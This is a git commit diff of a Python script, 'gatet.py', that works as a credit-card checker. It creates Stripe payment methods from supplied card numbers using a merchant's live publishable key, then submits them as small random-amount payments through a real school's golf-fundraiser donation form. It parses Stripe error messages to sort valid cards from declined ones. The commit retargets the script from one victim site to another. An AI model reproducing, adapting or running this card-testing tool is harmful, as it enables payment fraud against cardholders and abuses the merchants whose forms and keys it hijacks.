104761582bee713e52c72a8911d9137e859d6f7d
Rodamuser08 <rodamuser08@gmail.com>
2025-07-05 13:06:43 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -29,19 +29,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&key=pk_live_51Ortl8Dhc5eDlkdGVRGpXhjK3hp3qKIfyGglkYexCJWA62UwxYn771d3gCV83DuFyGX6mN4zIaJR23XSoIAa8sgC009uaM5Q3O'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&key=pk_live_51KpzzULXTIjil4Wl456FggVEW7pLqDBKM4RnzNb1oZK71a0lWsZo7WjvXkgKKyeQor012ypYMjDzfhf5Fb2AnvoE00VOhZ93NA'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'ibbce.com',
+	    'authority': 'orangevillechristianschool.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://ibbce.com',
-	    'referer': 'https://ibbce.com/registration-form/',
+	    'origin': 'https://orangevillechristianschool.com',
+	    'referer': 'https://orangevillechristianschool.com/golf-tournament-fundraiser/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -53,16 +53,21 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1751683837087',
+	    't': '1751694981093',
 	}
 	
 	data = {
-	    'data': f'item_3__fluent_sf=&__fluent_form_embded_post_id=830&_fluentform_3_fluentformnonce=afe7648db7&_wp_http_referer=%2Fregistration-form%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser{random_amount1}{random_amount2}%40gmail.com&phone=&input_text=NY&input_text_1=NY&input_text_2=NY&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Bcountry%5D=US&input_text_3=1&dropdown=Speaker&dropdown_1=1&dropdown_2=No&input_radio=Retired%20-%20%E2%82%AC260&payment-coupon=&custom-payment-amount={random_amount1}.{random_amount2}&payment_method=stripe&__ff_all_applied_coupons=&__stripe_payment_method_id={pm}',
+	    'data': f'__fluent_form_embded_post_id=8832&_fluentform_50_fluentformnonce=54d844f504&_wp_http_referer=%2Fgolf-tournament-fundraiser%2F&input_radio=Dinner%20Only&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&phone=%2B14303000850&email=rodamuser{random_amount1}{random_amount2}%40gmail.com&numeric_field_4=125&custom-payment-amount_4={random_amount1}.{random_amount2}&dropdown=Credit%20Card&payment_method=stripe&signature=&__stripe_payment_method_id={pm}',
 	    'action': 'fluentform_submit',
-	    'form_id': '3',
+	    'form_id': '50',
 	}
 	
-	response = requests.post('https://ibbce.com/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
+	response = requests.post(
+	    'https://orangevillechristianschool.com/wp-admin/admin-ajax.php',
+	    params=params,
+	    headers=headers,
+	    data=data,
+	)
 	
 	try:
 		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
